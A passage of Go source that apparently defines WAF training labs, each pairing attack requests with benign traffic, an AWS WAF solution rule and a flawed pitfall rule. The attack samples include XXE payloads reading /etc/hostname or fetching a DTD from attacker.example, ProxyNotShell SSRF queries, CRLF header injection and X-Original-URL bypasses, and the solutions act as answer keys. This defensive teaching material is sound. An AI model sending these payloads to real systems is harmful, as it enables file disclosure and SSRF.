				"POST /api/import, which receives order data from partners, processes XML external entity references (<!ENTITY x SYSTEM \"file:///...\">), letting attackers read server files (XXE)."),
		},
		Conditions: []Text{
			T("取引先の XML は DOCTYPE や ENTITY の宣言を使いません。ENTITY の宣言を含む XML を止めてください。",
				"Partner XML never uses DOCTYPE or ENTITY declarations. Block XML that contains an ENTITY declaration."),
			T("XML はタグの大文字小文字を区別しませんが、パーサーによっては小文字の宣言も受け付けます。取引先の XML にはコメント (<!-- -->) が含まれることがあります。",
				"Some parsers also accept lowercase declarations. Partner XML sometimes includes comments (<!-- -->)."),
		},
		Patterns: []Pattern{
			{Attack, T("ファイルを読む外部実体", "External entity reading a file"), 10, func(r *rand.Rand) Request {
				return withBody(atk(r, post(r, "/api/import", "")), "application/xml", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>`)
			}},
			{Attack, T("外部サーバーを参照するパラメータ実体", "Parameter entity pointing at an external server"), 10, func(r *rand.Rand) Request {
				return withBody(atk(r, post(r, "/api/import", "")), "application/xml", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/x.dtd"> %p;]><r/>`)
			}},
			{Attack, T("小文字の宣言", "Lowercase declarations"), 10, func(r *rand.Rand) Request {
				return withBody(atk(r, post(r, "/api/import", "")), "application/xml", `<?xml version="1.0"?><!doctype r [<!entity x system "file:///etc/hostname">]><r>&x;</r>`)
			}},
			{Benign, T("取引先からの注文 XML", "Order XML from partners"), 25, func(r *rand.Rand) Request {
				return withBody(post(r, "/api/import", ""), "application/xml", pick(r, []string{
					`<?xml version="1.0"?><order id="1001"><item sku="A-1" qty="2"/></order>`,
					`<?xml version="1.0"?><!-- exported by ERP --><order id="1002"><item sku="B-7" qty="1"/></order>`,
					`<?xml version="1.0"?><order id="1003"><note>Legal ENTITY: ACME Corp.</note></order>`,
				}))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-xxe", w.Contains("<!entity", w.BodyField(), w.Lowercase)),
		SolutionNote: []Text{
			T("Lowercase をかけて <!entity を探すと、大文字・小文字どちらの宣言も見つかります。< と ! まで含めるので、本文中の ENTITY という単語は止まりません。",
				"Searching for <!entity after Lowercase finds declarations in either case. Including < and ! keeps the word ENTITY in normal text from matching."),
			T("Body の検査には上限 (ALB では 8 KB) があります。大きな XML の後ろに攻撃を置かれる場合に備え、Oversize handling の設定も確認しましょう。Level 4 の問題で詳しく扱います。",
				"Body inspection has a size limit (8 KB for ALB). Check your Oversize handling setting in case an attack is placed after a large XML payload. A Level 4 problem covers this in depth."),
		},
		Pitfall: w.Block("pitfall-xxe", w.Contains("<!", w.BodyField())),
		PitfallNote: []Text{
			T("「<! で始まる宣言」をすべて止めるルールです。攻撃は止まりますが、コメント (<!--) を含む正規の XML まで止めてしまいます。",
				"This rule blocks every \"<!\" declaration. It stops the attacks but also blocks legitimate XML containing comments (<!--)."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-graphql-introspection",
		CVE:   "CWE-200",
		Title: T("GraphQL: イントロスペクションでスキーマを丸見えに", "GraphQL: exposing the schema via introspection"),
		Summary: T("本番の GraphQL エンドポイントで、イントロスペクションによってスキーマ全体を取得されています。",
			"Attackers are pulling the entire schema from the production GraphQL endpoint via introspection."),
		Topics: []Text{T("正規表現の境界", "Regex boundaries"), T("よく使われる正規の値", "Common legitimate values")},
		Briefing: []Text{
			T("POST /graphql に、__schema や __type を使ったイントロスペクションのクエリが届いています。スキーマが丸見えになると、内部用の API や管理用のフィールドが攻撃者に知られてしまいます。",
				"Introspection queries using __schema and __type are arriving at POST /graphql. With the schema exposed, attackers learn about internal APIs and admin fields."),
		},
		Conditions: []Text{
			T("クエリに __schema または __type のフィールドを含むものを止めてください。",
				"Block queries that include the __schema or __type fields."),
			T("ただし、フロントエンドの GraphQL クライアントは、ほとんどのクエリに __typename というフィールドを自動で付けます。これは止めてはいけません。",
				"However, the front-end GraphQL client automatically adds a field called __typename to almost every query. Don't block it."),
		},
		Hints: []Text{
			T("__type の直後に英数字やアンダースコアが続く場合 (__typename) は除外する必要があります。",
				"You need to exclude cases where __type is followed by a letter, digit, or underscore (__typename)."),
			T("正規表現の [^A-Za-z0-9_] は「英数字とアンダースコア以外の 1 文字」を表します。",
				"In regex, [^A-Za-z0-9_] means \"one character that is not a letter, digit, or underscore\"."),
		},
		Patterns: []Pattern{
			{Attack, T("__schema によるスキーマの取得", "Fetching the schema with __schema"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/graphql", `{"query":"{ __schema { types { name fields { name } } } }"}`))
			}},
			{Attack, T("__type による型の調査", "Probing a type with __type"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/graphql", `{"query":"query { __type(name: \"User\") { fields { name } } }"}`))
			}},
			{Attack, T("改行を挟んだ __schema", "__schema with newlines"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/graphql", `{"query":"query IntrospectionQuery {\n  __schema\n  {\n queryType { name }\n }\n}"}`))
			}},
			{Benign, T("__typename 付きの正規のクエリ", "Legitimate queries with __typename"), 25, func(r *rand.Rand) Request {
				return postJSON(r, "/graphql", pick(r, []string{
					`{"query":"{ products(first: 10) { name price __typename } }"}`,
					`{"query":"{ user(id: 1) { name type __typename } }"}`,
					`{"query":"{ schemaVersion }"}`,
				}))
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-graphql-introspection", w.Regex(`__(schema|type)[^A-Za-z0-9_]`, w.BodyField())),
		SolutionNote: []Text{
			T("__(schema|type) のあとに「英数字とアンダースコア以外の 1 文字」が続くものだけに一致させます。__typename は n が続くので一致しません。",
				"Match only when __(schema|type) is followed by a character that isn't a letter, digit, or underscore. __typename is followed by n, so it doesn't match."),
			T("「その文字列が単語として現れているか」を正規表現で表すのは、誤検知を避けるためによく使う技です。",
				"Expressing \"this string appears as a whole word\" with a regex is a common technique for avoiding false positives."),
		},
		Pitfall: w.Block("pitfall-graphql", w.Or(w.Contains("__schema", w.BodyField()), w.Contains("__type", w.BodyField()))),
		PitfallNote: []Text{
			T("条件の文章をそのまま 2 つの文字列マッチにしたルールです。__type が __typename にも含まれるため、正規のクエリのほとんどを止めてしまいます。",
				"This rule turns the condition text directly into two string matches. Because __type is contained in __typename, it blocks almost every legitimate query."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-proxynotshell",
		CVE:   "CVE-2022-41040",
		Title: T("ProxyNotShell: 先読み正規表現を移植する", "ProxyNotShell: porting a lookahead regex"),
		Summary: T("Exchange Server の SSRF。ベンダーの緩和策の正規表現は、AWS WAF ではそのまま使えません。",
			"An SSRF in Exchange Server. The vendor's mitigation regex can't be used as-is in AWS WAF."),
		Topics: []Text{T("ベンダーの緩和策の移植", "Porting a vendor mitigation"), T("URL = パス + クエリ", "URL = path + query")},
		Briefing: []Text{
			T("Microsoft Exchange Server で、autodiscover の処理を悪用して内部の PowerShell エンドポイントに到達できる脆弱性 (ProxyNotShell) が見つかりました。",
				"Microsoft Exchange Server has a flaw (ProxyNotShell) that abuses autodiscover processing to reach the internal PowerShell endpoint."),
			T("Microsoft は IIS の URL 書き換えルールで、URL に autodiscover と powershell の両方を含むリクエストを止める緩和策を出しました。正規表現は .*autodiscover\\.json.*Powershell.* や (?=.*autodiscover)(?=.*powershell) です。",
				"Microsoft published a mitigation using IIS URL Rewrite rules that blocks requests whose URL contains both autodiscover and powershell, with regexes such as .*autodiscover\\.json.*Powershell.* and (?=.*autodiscover)(?=.*powershell)."),
		},
		Conditions: []Text{
			T("URL (パスとクエリ文字列の全体) に autodiscover と powershell の両方を含むものを止めてください。大文字小文字は区別しません。",
				"Block requests whose URL (the whole path and query string) contains both autodiscover and powershell, case-insensitively."),
			T("AWS WAF の正規表現は (?=...) のような先読みに対応していません。また、AWS WAF にはパスとクエリをつなげた「URL 全体」という検査対象はありません。",
				"AWS WAF regexes don't support lookaheads like (?=...). AWS WAF also has no inspection target for the whole URL with path and query joined."),
		},
		Hints: []Text{
			T("「A と B の両方を含む」は、先読みの代わりに 2 つの文字列マッチを AND でつなげば表現できます。",
				"Instead of a lookahead, \"contains both A and B\" can be expressed by joining two string matches with AND."),
			T("「URL に含む」は「URI path か Query string のどちらかに含む」(OR) と言い換えられます。",
				"\"Contained in the URL\" can be rephrased as \"contained in either the URI path or the query string\" (OR)."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 10, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/autodiscover/autodiscover.json", ""))
				req.RawQuery = "@attacker.example/owa/&Email=autodiscover/autodiscover.json%3F@attacker.example&Protocol=XYZ&FooProtocol=Powershell"
				return req
			}},
			{Attack, T("powershell をパスの位置に", "powershell in the path position"), 10, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/autodiscover/autodiscover.json", ""))
				req.RawQuery = "@attacker.example/powershell/?X-Rps-CAT=wafdojo-test"
				return req
			}},
			{Attack, T("1 文字をエンコード", "One character encoded"), 10, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/autodiscover/autodiscover.json", ""))
				req.RawQuery = "@attacker.example/%50owershell/?X-Rps-CAT=wafdojo-test"
				return req
			}},
			{Attack, T("autodiscover もクエリに入れる", "autodiscover in the query too"), 10, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/mapi/nspi/", ""))
				req.RawQuery = "Email=Autodiscover/autodiscover.json%3F@attacker.example&Protocol=PowerShell"
				return req
			}},
			{Benign, T("Outlook の正規の autodiscover", "Legitimate Outlook autodiscover"), 20, func(r *rand.Rand) Request {
				if r.IntN(2) == 0 {
					return withBody(post(r, "/autodiscover/autodiscover.xml", ""), "text/xml", `<Autodiscover><Request><EMailAddress>user@example.com</EMailAddress></Request></Autodiscover>`)
				}
				return get(r, "/autodiscover/autodiscover.json", "Email=user%40example.com&Protocol=ActiveSync")
			}},
			{Benign, T("PowerShell の解説記事と OWA", "PowerShell articles and OWA"), 15, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/docs/powershell-basics", "/owa/auth/logon.aspx"}), "")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-proxynotshell", w.And(
			w.Or(
				w.Contains("autodiscover", w.UriPath(), w.URLDecode, w.Lowercase),
				w.Contains("autodiscover", w.QueryString(), w.URLDecode, w.Lowercase),
			),
			w.Or(
				w.Contains("powershell", w.UriPath(), w.URLDecode, w.Lowercase),
				w.Contains("powershell", w.QueryString(), w.URLDecode, w.Lowercase),
			),
		)),
		SolutionNote: []Text{
			T("(?=.*A)(?=.*B) は「A を含む AND B を含む」と同じ意味です。AWS WAF では AND ステートメントで表します。",
				"(?=.*A)(?=.*B) means the same as \"contains A AND contains B\". In AWS WAF, express it with an AND statement."),
			T("「URL」はパスとクエリ文字列に分かれているので、それぞれを OR で調べます。ベンダーの緩和策を移植するときは、検査対象の違いとエンジンの違い (正規表現の機能) の両方に気をつけます。",
				"The \"URL\" is split into path and query string, so check each with OR. When porting a vendor mitigation, watch for differences in both the inspected fields and the regex engine's features."),
		},
		Pitfall: w.Block("pitfall-proxynotshell", w.Regex(`autodiscover.*powershell`, w.QueryString(), w.URLDecode, w.Lowercase)),
		PitfallNote: []Text{
			T("先読みを外して .* でつないだ正規表現を、クエリ文字列だけに使うルールです。autodiscover がパスにしかない攻撃はすり抜けます。また .* は順番を固定してしまうので、powershell が先に出てくる場合も見逃します。",
				"This rule drops the lookahead, joins the words with .*, and applies it only to the query string. Attacks with autodiscover only in the path slip through, and .* fixes the order, so it also misses cases where powershell comes first."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-crlf-injection",
		CVE:   "CWE-113",
		Title: T("CRLF インジェクション: 改行でヘッダーを書き足す", "CRLF injection: adding headers with line breaks"),
		Summary: T("リダイレクト先のパラメータに改行を入れると、レスポンスに任意のヘッダーを書き足せる脆弱性。",
			"Putting line breaks in the redirect parameter lets attackers add arbitrary response headers."),
		Topics: []Text{T("制御文字の正規表現", "Regex for control characters"), T("URL decode を 2 回", "URL decode twice")},
		Briefing: []Text{
			T("GET /redirect?to=<遷移先> は、to の値をそのまま Location ヘッダーに書いています。値に改行コード (CR LF) を入れると、Set-Cookie などのヘッダーを書き足せてしまいます (HTTP レスポンス分割)。",
				"GET /redirect?to=<destination> writes the to value straight into the Location header. Putting line breaks (CR LF) in the value lets attackers add headers such as Set-Cookie (HTTP response splitting)."),
		},
		Conditions: []Text{
			T("to パラメータに改行コード (CR または LF) が含まれるものを止めてください。改行は %0d・%0a としてエンコードされて届きます。",
				"Block requests whose to parameter contains a line break (CR or LF). Line breaks arrive encoded as %0d and %0a."),
			T("このアプリのフレームワークは、パラメータを 2 回デコードすることがあります。",
				"This app's framework sometimes decodes parameters twice."),
		},
		Hints: []Text{
			T("改行はコンソールの文字列欄には入力しにくいので、正規表現の \\r と \\n を使いましょう。",
				"Line breaks are hard to type into the console's string field, so use \\r and \\n in a regex."),
			T("LF (%0a) だけで改行として扱われる場合もあります。CR と LF の両方がそろっていることを条件にしないでください。",
				"Sometimes LF (%0a) alone counts as a line break. Don't require CR and LF to appear together."),
		},
		Patterns: []Pattern{
			{Attack, T("CR LF で Set-Cookie を追加", "Adding Set-Cookie with CR LF"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/redirect", "to=/home%0d%0aSet-Cookie:%20session=wafdojo-test"))
			}},
			{Attack, T("LF だけで Location を追加", "Adding Location with LF only"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/redirect", "to=/home%0ALocation:%20https://attacker.example/"))
			}},
			{Attack, T("大文字の %0D%0A", "Uppercase %0D%0A"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/redirect", "to=/home%0D%0ASet-Cookie:%20admin=1"))
			}},
			{Attack, T("二重エンコード", "Double encoding"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/redirect", "to=/home%250d%250aSet-Cookie:%20session=wafdojo-test"))
			}},
			{Benign, T("正規のリダイレクト", "Legitimate redirects"), 25, func(r *rand.Rand) Request {
				return get(r, "/redirect", q("to", pick(r, []string{"/account", "/cart", "/search?q=shoes&page=2"})))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-crlf-injection", w.Regex(`[\r\n]`, w.QueryArg("to"), w.URLDecode, w.URLDecode)),
		SolutionNote: []Text{
			T("[\\r\\n] は「CR か LF のどちらか 1 文字」を表します。URL decode を 2 回かけると、二重エンコードされた %250d%250a も改行に戻ります。",
				"[\\r\\n] means \"one character that is CR or LF\". Decoding twice also turns the double-encoded %250d%250a back into line breaks."),
		},
		Pitfall: w.Block("pitfall-crlf", w.Contains("%0d%0a", w.QueryString(), w.Lowercase)),
		PitfallNote: []Text{
			T("エンコードされた %0d%0a を探すルールです。LF だけの攻撃と二重エンコードの攻撃がすり抜けます。",
				"This rule looks for the encoded %0d%0a. LF-only attacks and double-encoded attacks slip through."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-x-original-url",
		CVE:   "CWE-288",
		Title: T("X-Original-URL: ヘッダーでパス制限をすり抜ける", "X-Original-URL: bypassing path restrictions with a header"),
		Summary: T("アプリが X-Original-URL / X-Rewrite-URL ヘッダーでパスを上書きできるため、パスで作ったアクセス制限をすり抜けられます。",
			"The app lets the X-Original-URL / X-Rewrite-URL headers override the path, so path-based access restrictions can be bypassed."),
		Topics: []Text{T("アクセス制御の抜け道", "Access-control bypasses"), T("ヘッダーの有無", "Header presence")},
		Briefing: []Text{
			T("社内向けの /internal/ は、WAF のパスのルールで外部からのアクセスを止めています。ところがバックエンドのフレームワークは、X-Original-URL や X-Rewrite-URL ヘッダーがあると、そちらのパスを優先して処理します。",
				"The company-internal /internal/ area is blocked from outside by a WAF path rule. But the backend framework gives priority to the path in X-Original-URL or X-Rewrite-URL when either header is present."),
			T("攻撃者は GET / に X-Original-URL: /internal/settings を付けて送り、WAF のパスのルールをすり抜けています。",
				"Attackers send GET / with X-Original-URL: /internal/settings and slip past the WAF path rule."),
		},
		Conditions: []Text{
			T("あなたのシステムでは、どちらのヘッダーも正規の利用者が付けることはありません。",
				"No legitimate user of your system ever sends either header."),
			T("社外向けの採用ページ /internal-recruiting/ は誰でも見られるページです。",
				"The public recruiting page /internal-recruiting/ is open to everyone."),
		},
		Patterns: []Pattern{
			{Attack, T("X-Original-URL で設定画面へ", "X-Original-URL to the settings page"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/", "")), "X-Original-URL", "/internal/settings")
			}},
			{Attack, T("X-Rewrite-URL でユーザー一覧へ", "X-Rewrite-URL to the user list"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/news", "")), "X-Rewrite-URL", "/internal/users")
			}},
			{Attack, T("ヘッダー名を小文字で", "Header name in lowercase"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, get(r, "/", "")), "x-original-url", "/INTERNAL/export")
			}},
			{Benign, T("採用ページ", "The recruiting page"), 20, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/internal-recruiting/jobs", "/internal-recruiting/apply"}), "")
			}},
			{Benign, lblBrowse, 25, browse},
		},
		Solution: w.Block("block-url-override-headers", w.Or(
			w.Present(w.Header("x-original-url")),
			w.Present(w.Header("x-rewrite-url")),
		)),
		SolutionNote: []Text{
			T("パスのルールはリクエストの「見かけのパス」しか見ません。アプリが別の場所からパスを読む場合は、その場所 (ここではヘッダー) も塞ぐ必要があります。",
				"Path rules only see the request's apparent path. If the app reads the path from somewhere else, you have to close that place too (here, the headers)."),
		},
		Pitfall: w.Block("pitfall-x-original-url", w.Contains("/internal", w.UriPath(), w.Lowercase)),
		PitfallNote: []Text{
			T("パスで /internal を止めるだけのルールです。攻撃のパスは / や /news なのですり抜け、/internal-recruiting/ の採用ページを止めてしまいます。",
				"This rule only blocks /internal by path. Attack paths are / and /news, so they slip through, while the /internal-recruiting/ page gets blocked."),
		},
	})
}
